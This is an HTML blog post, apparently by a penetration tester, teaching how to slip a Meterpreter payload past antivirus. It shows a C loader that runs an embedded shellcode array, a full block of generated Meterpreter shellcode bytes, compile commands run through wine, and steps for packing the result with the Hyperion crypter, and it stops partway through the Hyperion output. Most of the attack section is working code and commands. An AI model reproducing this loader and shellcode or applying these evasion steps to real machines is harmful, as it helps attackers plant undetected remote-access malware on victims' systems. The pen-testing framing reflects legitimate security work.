@@ -1,0 +1,1462 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bypass Antivirus with Meterpreter as the Payload &#038; Hyperion Fun | Christopher Truncer&#039;s Website</title>
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="https://www.christophertruncer.com/xmlrpc.php">
+
+<link rel='dns-prefetch' href='//www.christophertruncer.com' />
+<link rel='dns-prefetch' href='//secure.gravatar.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel='dns-prefetch' href='//v0.wordpress.com' />
+<link rel='dns-prefetch' href='//jetpack.wordpress.com' />
+<link rel='dns-prefetch' href='//s0.wp.com' />
+<link rel='dns-prefetch' href='//s1.wp.com' />
+<link rel='dns-prefetch' href='//s2.wp.com' />
+<link rel='dns-prefetch' href='//public-api.wordpress.com' />
+<link rel='dns-prefetch' href='//0.gravatar.com' />
+<link rel='dns-prefetch' href='//1.gravatar.com' />
+<link rel='dns-prefetch' href='//2.gravatar.com' />
+<link rel="alternate" type="application/rss+xml" title="Christopher Truncer&#039;s Website &raquo; Feed" href="https://www.christophertruncer.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Christopher Truncer&#039;s Website &raquo; Comments Feed" href="https://www.christophertruncer.com/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Christopher Truncer&#039;s Website &raquo; Bypass Antivirus with Meterpreter as the Payload &#038; Hyperion Fun Comments Feed" href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/feed/" />
+<!-- This site uses the Google Analytics by MonsterInsights plugin v7.12.3 - Using Analytics tracking - https://www.monsterinsights.com/ -->
+<script type="text/javascript" data-cfasync="false">
+    (window.gaDevIds=window.gaDevIds||[]).push("dZGIzZG");
+	var mi_version         = '7.12.3';
+	var mi_track_user      = true;
+	var mi_no_track_reason = '';
+	
+	var disableStr = 'ga-disable-UA-96493165-1';
+
+	/* Function to detect opted out users */
+	function __gaTrackerIsOptedOut() {
+		return document.cookie.indexOf(disableStr + '=true') > -1;
+	}
+
+	/* Disable tracking if the opt-out cookie exists. */
+	if ( __gaTrackerIsOptedOut() ) {
+		window[disableStr] = true;
+	}
+
+	/* Opt-out function */
+	function __gaTrackerOptout() {
+	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+	  window[disableStr] = true;
+	}
+
+	if ( 'undefined' === typeof gaOptout ) {
+		function gaOptout() {
+			__gaTrackerOptout();
+		}
+	}
+	
+	if ( mi_track_user ) {
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');
+
+		__gaTracker('create', 'UA-96493165-1', 'auto');
+		__gaTracker('set', 'forceSSL', true);
+		__gaTracker('require', 'displayfeatures');
+		__gaTracker('send','pageview');
+	} else {
+		console.log( "" );
+		(function() {
+			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+			var noopfn = function() {
+				return null;
+			};
+			var noopnullfn = function() {
+				return null;
+			};
+			var Tracker = function() {
+				return null;
+			};
+			var p = Tracker.prototype;
+			p.get = noopfn;
+			p.set = noopfn;
+			p.send = noopfn;
+			var __gaTracker = function() {
+				var len = arguments.length;
+				if ( len === 0 ) {
+					return;
+				}
+				var f = arguments[len-1];
+				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
+					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
+					return;
+				}
+				try {
+					f.hitCallback();
+				} catch (ex) {
+
+				}
+			};
+			__gaTracker.create = function() {
+				return new Tracker();
+			};
+			__gaTracker.getByName = noopnullfn;
+			__gaTracker.getAll = function() {
+				return [];
+			};
+			__gaTracker.remove = noopfn;
+			window['__gaTracker'] = __gaTracker;
+					})();
+		}
+</script>
+<!-- / Google Analytics by MonsterInsights -->
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.christophertruncer.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=1047b40d9f4deac2ccce36a1918592b9"}};
+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://www.christophertruncer.com/wp-includes/css/dist/block-library/style.min.css?ver=1047b40d9f4deac2ccce36a1918592b9' type='text/css' media='all' />
+<style id='wp-block-library-inline-css' type='text/css'>
+.has-text-align-justify{text-align:justify;}
+</style>
+<link rel='stylesheet' id='typo-style-css'  href='https://www.christophertruncer.com/wp-content/themes/typo-wpcom/style.css?ver=1047b40d9f4deac2ccce36a1918592b9' type='text/css' media='all' />
+<link rel='stylesheet' id='typo-vast-shadow-css'  href='https://fonts.googleapis.com/css?family=Vast+Shadow&#038;ver=1047b40d9f4deac2ccce36a1918592b9' type='text/css' media='all' />
+<link rel='stylesheet' id='typo-droid-serif-css'  href='https://fonts.googleapis.com/css?family=Droid+Serif%3A400%2C700%2C400italic%2C700italic&#038;ver=1047b40d9f4deac2ccce36a1918592b9' type='text/css' media='all' />
+<link rel='stylesheet' id='social-logos-css'  href='https://www.christophertruncer.com/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=9.0.2' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack_css-css'  href='https://www.christophertruncer.com/wp-content/plugins/jetpack/css/jetpack.css?ver=9.0.2' type='text/css' media='all' />
+<script type='text/javascript' id='monsterinsights-frontend-script-js-extra'>
+/* <![CDATA[ */
+var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/www.christophertruncer.com","hash_tracking":"false"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.christophertruncer.com/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend.min.js?ver=7.12.3' id='monsterinsights-frontend-script-js'></script>
+<script type='text/javascript' src='https://www.christophertruncer.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp' id='jquery-core-js'></script>
+<link rel="https://api.w.org/" href="https://www.christophertruncer.com/wp-json/" /><link rel="alternate" type="application/json" href="https://www.christophertruncer.com/wp-json/wp/v2/posts/269" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.christophertruncer.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.christophertruncer.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='SQLMap &#8211;data trick' href='https://www.christophertruncer.com/sqlmap-data-trick/' />
+<link rel='next' title='Hack3rcon 3 CTF Writeups!' href='https://www.christophertruncer.com/hack3rcon-3-ctf-event/' />
+
+<link rel="canonical" href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/" />
+<link rel='shortlink' href='https://wp.me/pYWGf-4l' />
+<link rel="alternate" type="application/json+oembed" href="https://www.christophertruncer.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.christophertruncer.com%2Fbypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.christophertruncer.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.christophertruncer.com%2Fbypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun%2F&#038;format=xml" />
+<script type="text/javascript">
+(function(url){
+	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
+	var addEvent = function(evt, handler) {
+		if (window.addEventListener) {
+			document.addEventListener(evt, handler, false);
+		} else if (window.attachEvent) {
+			document.attachEvent('on' + evt, handler);
+		}
+	};
+	var removeEvent = function(evt, handler) {
+		if (window.removeEventListener) {
+			document.removeEventListener(evt, handler, false);
+		} else if (window.detachEvent) {
+			document.detachEvent('on' + evt, handler);
+		}
+	};
+	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
+	var logHuman = function() {
+		if (window.wfLogHumanRan) { return; }
+		window.wfLogHumanRan = true;
+		var wfscr = document.createElement('script');
+		wfscr.type = 'text/javascript';
+		wfscr.async = true;
+		wfscr.src = url + '&r=' + Math.random();
+		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
+		for (var i = 0; i < evts.length; i++) {
+			removeEvent(evts[i], logHuman);
+		}
+	};
+	for (var i = 0; i < evts.length; i++) {
+		addEvent(evts[i], logHuman);
+	}
+})('//www.christophertruncer.com/?wordfence_lh=1&hid=18B2CF875ABD83408DBE016C7C495250');
+</script><style type="text/css" id="custom-background-css">
+body.custom-background { background-image: url("https://www.christophertruncer.com/wp-content/themes/typo-wpcom/images/body-bg.png"); background-position: left top; background-size: auto; background-repeat: repeat; background-attachment: fixed; }
+</style>
+	
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Bypass Antivirus with Meterpreter as the Payload &#038; Hyperion Fun" />
+<meta property="og:url" content="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/" />
+<meta property="og:description" content="This is a tutorial on how to create your own exe template for meterpreter to bypass anti-virus. It also goes into using hyperion to pack and encrypt your meterpreter payload to help further prevent…" />
+<meta property="article:published_time" content="2012-08-28T23:28:56+00:00" />
+<meta property="article:modified_time" content="2013-12-16T14:23:08+00:00" />
+<meta property="og:site_name" content="Christopher Truncer&#039;s Website" />
+<meta property="og:image" content="https://www.christophertruncer.com/wp-content/uploads/2012/08/ByPass-AV-2.png" />
+<meta property="og:image:width" content="828" />
+<meta property="og:image:height" content="599" />
+<meta property="og:locale" content="en_US" />
+<meta name="twitter:text:title" content="Bypass Antivirus with Meterpreter as the Payload &#038; Hyperion Fun" />
+<meta name="twitter:image" content="https://www.christophertruncer.com/wp-content/uploads/2012/08/ByPass-AV-2.png?w=640" />
+<meta name="twitter:card" content="summary_large_image" />
+
+<!-- End Jetpack Open Graph Tags -->
+</head>
+
+<body class="post-template-default single single-post postid-269 single-format-standard custom-background">
+<div id="page" class="hfeed site">
+		<header id="masthead" class="site-header" role="banner">
+				<div class="site-branding">
+			<h1 class="site-title"><a href="https://www.christophertruncer.com/" rel="home">Christopher Truncer&#039;s Website</a></h1>
+			<h2 class="site-description">A Hacker&#039;s Perspective</h2>
+		</div>
+
+		<nav id="site-navigation" class="main-navigation" role="navigation">
+			<h1 class="menu-toggle">Menu</h1>
+			<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+
+			
+				<div class="menu"><ul>
+<li ><a href="https://www.christophertruncer.com/">Home</a></li><li class="page_item page-item-776"><a href="https://www.christophertruncer.com/presentations/">Presentations</a></li>
+<li class="page_item page-item-875"><a href="https://www.christophertruncer.com/projects/">Projects</a></li>
+</ul></div>
+
+			
+		</nav><!-- #site-navigation -->
+	</header><!-- #masthead -->
+
+	<div id="content" class="site-content">
+
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		
+			<div class="hentry-wrapper">
+	<article id="post-269" class="post-269 post type-post status-publish format-standard hentry category-featured-category category-it-security tag-antivirus tag-bypass-antivirus tag-hyperion tag-meterpreter">
+		<header class="entry-header">
+							<h1 class="entry-title">Bypass Antivirus with Meterpreter as the Payload &#038; Hyperion Fun</h1>			
+			<div class="entry-meta">
+				<span class="posted-on"><a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/" rel="bookmark"><time class="entry-date published" datetime="2012-08-28T19:28:56-06:00">August 28, 2012</time><time class="updated" datetime="2013-12-16T09:23:08-07:00">December 16, 2013</time></a></span><span class="byline"><span class="author vcard"><a class="url fn n" href="https://www.christophertruncer.com/author/ctruncer/">Christopher Truncer</a></span></span>												<span class="cat-links">
+					<a href="https://www.christophertruncer.com/category/featured-category/" rel="category tag">Featured Category</a>, <a href="https://www.christophertruncer.com/category/it-security/" rel="category tag">IT Security</a>				</span>
+				
+								<span class="tags-links">
+					<a href="https://www.christophertruncer.com/tag/antivirus/" rel="tag">antivirus</a>, <a href="https://www.christophertruncer.com/tag/bypass-antivirus/" rel="tag">bypass antivirus</a>, <a href="https://www.christophertruncer.com/tag/hyperion/" rel="tag">hyperion</a>, <a href="https://www.christophertruncer.com/tag/meterpreter/" rel="tag">meterpreter</a>				</span>
+				
+			</div><!-- .entry-meta -->
+		</header><!-- .entry-header -->
+
+		<div class="entry-content">
+			<p><em><strong>Note: Check the <a href="https://www.christophertruncer.com/veil-a-payload-generator-to-bypass-antivirus/">tool I work on with a great team, Veil</a>.  It is designed to generate payloads for bypassing Antivirus.  This is more up-to-date than this post.</strong></em></p>
+<p>&nbsp;</p>
+<p>On any pen test, you will discover a number of hosts that are vulnerable to a variety of exploits. So after gathering all the information we can about our target(s), one of the next few steps may be to exploit the system.  Typically, I love using meterpreter as my payload because of the functionality that it offers.  Our team would then fire up Metasploit, configure our exploit for our target, exploit the box, see us uploading the payload, only to have nothing happen.</p>
+<p>So what&#8217;s the problem?  Well, obviously it could be a number of things, versions are wrong, exploit just didn&#8217;t work, etc.  It&#8217;s also very possible that everything is working correctly, except the host-based anti-virus caught your meterpreter payload, and won&#8217;t let you get on the box.  I&#8217;ve come across this problem multiple times, and would love to share a technique that I use to try to circumvent the anti-virus installed on a machine.</p>
+<p>First, I&#8217;m happy to give credit to two great writeups <a href="http://www.whenisfive.com/2011/12/12/creating-custom-meterpreter-exe-templates-to-bypass-windows-av/">here</a> and <a href="http://e-spohn.com/blog/2012/08/02/pe-crypters-hyperion/">here</a> that I looked up and incorporated into this attack.  I saw a few things that needed to be edited and tried to compile what I did (based off those two articles) into this post.</p>
+<p>One of the methods of bypassing anti-virus is to create a &#8220;custom&#8221; executable template for meterpreter.  As a starting point, you can use the following as a base to your source code (go ahead and open your favorite text editor, lets call the file &#8220;base.c&#8221;, and add the following):</p>
+<p>&nbsp;</p>
+<pre>// This should be random padding
+unsigned char padding[]=
+
+;
+
+// Our Meterpreter code goes here
+unsigned char payload[]=
+
+;
+
+// Push Meterpreter into memory
+int main(void) { ((void (*)())payload)();}</pre>
+<p>&nbsp;</p>
+<p>With the rough outline of our code down, the first thing we will want to do is create the random padding we want to put at the beginning of our file.  You can easily change the size of your random padding by deleting the &#8220;1028&#8221; from the following command, and replacing it with the size you want to use.</p>
+<p>Our command and its output should look similar to the following:</p>
+<p style="text-align: center;"><a href="https://www.christophertruncer.com/wp-content/uploads/2012/08/ByPass-AV-1.png"><img loading="lazy" class="aligncenter size-full wp-image-272" title="ByPass AV - 1" alt="" src="http://www.christophertruncer.com/wp-content/uploads/2012/08/ByPass-AV-1.png" width="664" height="309" /></a></p>
+<p>Go ahead and paste the random padding into our base.c file into the appropriate section at the top (in between double quotes).  Our code should now look similar to the following:</p>
+<p>&nbsp;</p>
+<pre>// This should be random padding
+unsigned char padding[]=
+"F9d9CxkqvLlodqpws5x4KoI3KoLdcLTae-0DMrcDZiscZi7Gmzug6g1n8L_W6pzPR-bGsm74TBHy3GDof6o-cMIAaiF5nEvEadpxl9p94w12fiLDreuEjLLhW2QXFbKBAIWOKXvMoiBGZHZY4Lyk24HTPuTonrTbf__hZ0G_q_5DVXfKU0s-muqroz-U6j-wDrX2CzKapy8o1Y5zGo0T3BozAuzwe7Q1A-R4JIWEU8LR-8MJrlF5ZthMo4M661VM8-6CY7duKz29tiPr5IEtpYXBVJyhHYCsPd5iVrNc3wzSVQ6jP9dht-znpNi4-wqWVjKng_3j5WjOlva3_jqLcqkMQ5NfrT7ipYlqxvqgYMUU8rvo9PS_DVkA3tM0W1T6BXLE7nmvZmxojfwfNKQEzzCn1-tYyqcd1z1UTnGEIoZp2sHY-kgofDDnHbNk-4-oMQdwuBt56oCWh7jcNwokcpte26FLJBX4C-yM46CJUlNFrgBg28776xxlTyC02Hs-YdkR-rJNvTt3OWOdCNt-1ocoj20QskIVdv2_XZgrTnxyIEOBBYrrmKHgBq4Qvd816iK1Ua2ZymTVRov1qJeiqvIoCr-hufUkQGjMCCGGSAjPacemgU3ztZZZJIPpB7Dc_zIpkSsaCr0kpDz9lFPn-Fn--cQh2l2gUIA8eiMHFeMLDh40da83tfThQqd_MsGb2OL2LmGCpV_QUdbFecP6-eI80sZG34j9Z3ur_6blZbu1f1qjME-bJKJ2ueT0arvydnnfzHIOt-vt26f0cBeE_11hUiTYmhtH9U4Mppe-eVMUJ5E3XU-Q-20-qCZZBWGV0kK4Lpxu8QGI_NrkRcS3CEantKhUkIaxxXWZRJvk0uEcB_YHerHjZT6Fw8_omY8O2BLT5sAg7f-MQm1P8RfTXYILiTbaqzxvg44y8zdEQpzPY4bgy3svNFVheIseFmOPKs-jL5eJkOlrkvniKFwCKatGKF8Aewli1sYmLP3HKVK8Voy-7b-j377x-SMQKUyByz9F"
+;
+
+// Our Meterpreter code goes here
+unsigned char payload[]=
+
+;
+
+// Push Meterpreter into memory
+int main(void) { ((void (*)())payload)();}</pre>
+<pre></pre>
+<p>Now that we have the padding in our base file, we can create our meterpreter shellcode.  I find it easiest to create the shellcode with msfvenom.  You can go ahead and create your shellcode using nearly the same command I am using here, just be sure to change your payload option values:</p>
+<p style="text-align: center;"><a href="https://www.christophertruncer.com/wp-content/uploads/2012/08/ByPass-AV-2.png"><img loading="lazy" class="aligncenter size-full wp-image-273" title="ByPass AV - 2" alt="" src="http://www.christophertruncer.com/wp-content/uploads/2012/08/ByPass-AV-2.png" width="828" height="599" /></a></p>
+<p>With our meterpreter shellcode generated, go ahead and copy just the shellcode and paste it into the appropriate section within our base.c file.  Once you&#8217;ve done that, our base.c file should look similar to the following:</p>
+<pre></pre>
+<pre>// This should be random padding
+unsigned char padding[]=
+"F9d9CxkqvLlodqpws5x4KoI3KoLdcLTae-0DMrcDZiscZi7Gmzug6g1n8L_W6pzPR-bGsm74TBHy3GDof6o-cMIAaiF5nEvEadpxl9p94w12fiLDreuEjLLhW2QXFbKBAIWOKXvMoiBGZHZY4Lyk24HTPuTonrTbf__hZ0G_q_5DVXfKU0s-muqroz-U6j-wDrX2CzKapy8o1Y5zGo0T3BozAuzwe7Q1A-R4JIWEU8LR-8MJrlF5ZthMo4M661VM8-6CY7duKz29tiPr5IEtpYXBVJyhHYCsPd5iVrNc3wzSVQ6jP9dht-znpNi4-wqWVjKng_3j5WjOlva3_jqLcqkMQ5NfrT7ipYlqxvqgYMUU8rvo9PS_DVkA3tM0W1T6BXLE7nmvZmxojfwfNKQEzzCn1-tYyqcd1z1UTnGEIoZp2sHY-kgofDDnHbNk-4-oMQdwuBt56oCWh7jcNwokcpte26FLJBX4C-yM46CJUlNFrgBg28776xxlTyC02Hs-YdkR-rJNvTt3OWOdCNt-1ocoj20QskIVdv2_XZgrTnxyIEOBBYrrmKHgBq4Qvd816iK1Ua2ZymTVRov1qJeiqvIoCr-hufUkQGjMCCGGSAjPacemgU3ztZZZJIPpB7Dc_zIpkSsaCr0kpDz9lFPn-Fn--cQh2l2gUIA8eiMHFeMLDh40da83tfThQqd_MsGb2OL2LmGCpV_QUdbFecP6-eI80sZG34j9Z3ur_6blZbu1f1qjME-bJKJ2ueT0arvydnnfzHIOt-vt26f0cBeE_11hUiTYmhtH9U4Mppe-eVMUJ5E3XU-Q-20-qCZZBWGV0kK4Lpxu8QGI_NrkRcS3CEantKhUkIaxxXWZRJvk0uEcB_YHerHjZT6Fw8_omY8O2BLT5sAg7f-MQm1P8RfTXYILiTbaqzxvg44y8zdEQpzPY4bgy3svNFVheIseFmOPKs-jL5eJkOlrkvniKFwCKatGKF8Aewli1sYmLP3HKVK8Voy-7b-j377x-SMQKUyByz9F"
+;
+
+// Our Meterpreter code goes here
+unsigned char payload[]=</pre>
+<p>&#8220;\xba\xd7\x0c\xb4\xfa\xd9\xc1\xd9\x74\x24\xf4\x58\x2b\xc9\xb1&#8221;<br />
+&#8220;\x57\x83\xe8\xfc\x31\x50\x0e\x03\x87\x02\x56\x0f\xfd\xca\x4f&#8221;<br />
+&#8220;\x84\x25\x19\xd5\x05\x4e\x2c\x7c\x9b\xb9\x67\x30\x73\x88\x22&#8221;<br />
+&#8220;\x2b\x77\xbf\xd4\xc8\xb2\x5b\x6c\xf6\xd2\xd0\x3a\x54\xb7\xb6&#8221;<br />
+&#8220;\x6a\xd0\x10\xc4\xae\x92\xb7\x9b\xb4\x9c\x02\x72\xea\xfe\x1d&#8221;<br />
+&#8220;\xb9\x31\xbf\x3e\x09\xf5\x69\x25\xcb\x31\x56\x43\x8b\xec\xfe&#8221;<br />
+&#8220;\xd1\xbf\xad\x50\x7e\x8f\x9d\x5f\x13\xb8\xd6\x4a\x03\xfc\xb1&#8221;<br />
+&#8220;\x89\x08\x6f\xf9\x35\x3b\x1a\xd3\xf7\xe5\x50\x13\x0a\x0b\xc3&#8221;<br />
+&#8220;\x87\x34\x9c\x4c\x4b\xcf\xbf\x01\x20\x45\x85\x8e\x82\x1c\x0c&#8221;<br />
+&#8220;\xfa\x47\xa6\x03\xef\x16\xbd\xe9\x99\x87\xa9\xa9\x75\xf6\x6d&#8221;<br />
+&#8220;\x6c\x43\xa8\xd9\xd0\x18\xb4\xd1\x93\x18\xf1\x3f\x08\xd0\xe3&#8221;<br />
+&#8220;\x7a\x66\x1e\x90\x70\x90\xc3\x01\x61\xaf\xb4\xc0\x1e\xd8\x6d&#8221;<br />
+&#8220;\xb7\x88\xfa\x7b\x2d\x75\x2f\xea\xda\x22\x2f\x26\x7a\x7c\x4e&#8221;<br />
+&#8220;\x0a\xb8\x7a\xac\x1b\x74\x17\x3c\x92\x18\x6d\x67\xb3\x01\xb1&#8221;<br />
+&#8220;\x4a\x43\xe4\x72\xf8\x15\xf8\x4b\x4a\xfb\x65\xbb\xf2\x6f\xe9&#8221;<br />
+&#8220;\x9f\x58\x6b\xcd\x96\x7b\x80\xa9\xfe\xa6\x2e\xf7\xfa\xf5\x1d&#8221;<br />
+&#8220;\xc5\xd4\x3d\x73\xe2\xd2\x94\xce\x85\x35\x62\xc4\xb9\x1b\x87&#8221;<br />
+&#8220;\x20\x46\x16\xa6\xa4\xc2\x74\xfc\x5c\xfb\x83\x8b\x60\x4a\xd1&#8221;<br />
+&#8220;\x72\x48\xab\xd7\xd9\x86\x7f\x2b\xbb\x06\x74\x54\xf0\xb6\xb8&#8221;<br />
+&#8220;\xa8\x16\x97\xa2\xba\xc3\x79\x6f\xab\xdd\x6f\x3c\x74\x6c\xf4&#8221;<br />
+&#8220;\x9d\xcc\x34\x84\xef\x34\x0c\x78\xc1\xe9\x2e\x57\xf6\x73\x9f&#8221;<br />
+&#8220;\x12\x58\x6f\x48\xb5\x04\x45\x13\x86\x3c\xbb\xab\xce\x8a\x15&#8221;<br />
+&#8220;\x07\x65\x73\x0e\x50\xd1\xa2\x29\x6b\x46\x3b\x40\x9c\x56\x1a&#8221;<br />
+&#8220;\xb6\x8d\x22\x16\x66\x2f\xa8\x03\xdc\x58\x48\x91\x44\x18\xd9&#8221;<br />
+&#8220;\x1d\xb6\x0f\xfe\xca\x7b\x03\xd1\x94\x54\xba&#8221;</p>
+<pre>;</pre>
+<pre>// Push Meterpreter into memory
+int main(void) { ((void (*)())payload)();}</pre>
+<p>&nbsp;</p>
+<p>Congrats, you&#8217;ve made a pretty decent template file which includes our payload.  Now, all that you need to do is compile it.  I like to use gcc.exe within Backtrack with wine. So, you can navigate to the compiler (it&#8217;s at /root/.wine/drive_c/MinGW/bin/gcc.exe), call the compiler through wine, provide it our source file, and specify the output file. Your command should look similar to the following:</p>
+<p style="text-align: center;"><a href="https://www.christophertruncer.com/wp-content/uploads/2012/08/Bypass-AV-3.png"><img loading="lazy" class="aligncenter size-full wp-image-274" title="Bypass AV - 3" alt="" src="http://www.christophertruncer.com/wp-content/uploads/2012/08/Bypass-AV-3.png" width="833" height="215" /></a></p>
+<p>Congrats again.  You now have an executable that you should be able to drop on a windows machine that doesn&#8217;t get flagged by Microsoft Security Essentials in addition to a variety of anti-virus programs.</p>
+<p>So now what?</p>
+<p>There&#8217;s an additional step we can take to try to further prevent detection of our executable, and it&#8217;s with a packer &amp; encrypting tool called hyperion.  Hyperion is a tool that encrypts the executable you provide it with 5 rounds of AES encryption by default and outputs an executable.  The executable file that is produced by hyperion can then be ran on a windows machine.  The executable will brute force its own AES keys and then execute the payload you originally provided it.  It&#8217;s a sweet tool that does a really good job at hiding the payload you are encrypting.  The only problem with hyperion at times is that it can be detected as a packer by certain anti-virus programs.  However, it still is not recognized by a majority of AV solutions.</p>
+<p>This is a quick article introducing Hyperion, a sweet tool I found after listening to Dave Kennedy talk, and how it can be compiled.</p>
+<p>First, while researching how to use the tool, I came across <a href="http://e-spohn.com/blog/2012/08/02/pe-crypters-hyperion/">this resource</a> which helped me to write this article.</p>
+<p>Hyperion is a tool that can be used to help prevent your payload from being detected by antivirus.  It works by encrypting your payload via AES encryption, and essentially throwing away the keys.  It&#8217;s output is an encrypted executable.  When the output file is ran, the executable brute forces the encryption keys, and then runs the previously encrypted executable (meterpreter payload :)).</p>
+<p>So where do you get it and how can you compile it?  Hyperion can be found for download <a href="http://nullsecurity.net/tools/binary.html">at this location</a>.</p>
+<p>Once downloaded and unzipped, you can easily compile the tool with g++.exe on Backtrack.  To compile it, point g++.exe to the .cpp files within the &#8220;Crypter&#8221; directory under &#8220;Src&#8221;.  Your command may look similar to the following:</p>
+<pre>wine g++.exe Hyperion-1.0/Src/Crypter/*.cpp -o hyperion.exe</pre>
+<p>Your command should have completed without any errors, and now you have compiled hyperion for use.</p>
+<p>So all we need to do is call hyperion, provide it our executable that we want it to hide, and then give it the name of the executable to output.  Once compiled, hyperion can be run through wine or from the Windows command line.  Our commands and their output should look similar to the following:</p>
+<p><em>root@bt:~/.wine/drive_c/MinGW/bin/Hyperion-1.0# wine hyperion.exe metexecutable.exe encryptedmet.exe </em><br />
+<em>Opening metexecutable.exe</em><br />
+<em>Copied file to memory: 0x115868</em><br />
+<em>Found valid MZ signature</em><br />
+<em>Found pointer to PE Header: 0x80</em><br />
+<em>Found valid PE signature</em><br />
+<em>Found a PE32 file</em><br />
+<em>Number of Data Directories: 16</em><br />
+<em>Image Base: 0x400000</em></p>
+<p><em>Found Section: .text</em><br />
+<em>VSize: 0x924, VAddress: 0x1000, RawSize: 0xa00, RawAddress: 0x400</em></p>
+<p><em>Found Section: .data</em><br />
+<em>VSize: 0x5f0, VAddress: 0x2000, RawSize: 0x600, RawAddress: 0xe00</em></p>
+<p><em>Found Section: .rdata</em><br />
+<em>VSize: 0xc0, VAddress: 0x3000, RawSize: 0x200, RawAddress: 0x1400</em></p>
+<p><em>Found Section: .bss</em><br />
+<em>VSize: 0xe0, VAddress: 0x4000, RawSize: 0x0, RawAddress: 0x0</em></p>
+<p><em>Found Section: .idata</em><br />
+<em>VSize: 0x268, VAddress: 0x5000, RawSize: 0x400, RawAddress: 0x1600</em></p>
+<p><em>Input file size + Checksum: 0x4140</em><br />
